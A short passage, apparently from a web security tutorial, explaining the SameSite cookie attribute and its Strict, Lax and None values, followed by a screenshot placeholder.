**SameSite:** Controls when the cookie will be sent in cross-origin requests. It can have three possible values: "Strict," "Lax," or "None." The "SameSite=Strict" attribute ensures the cookie is only sent in same-site requests, while "SameSite=Lax" restricts its transmission in certain cross-site scenarios. "SameSite=None" allows the cookie to be sent in all cross-origin requests but requires the Secure attribute to be set as well.

These attributes allow developers to control the behavior and security of cookies within web applications. Understanding and properly configuring these attributes is important to ensure the privacy and integrity of user data.

![A screenshot of a computer Description automatically generated](media/cb4dae95ea952bcd8b2a8741b47bb2cf.png)
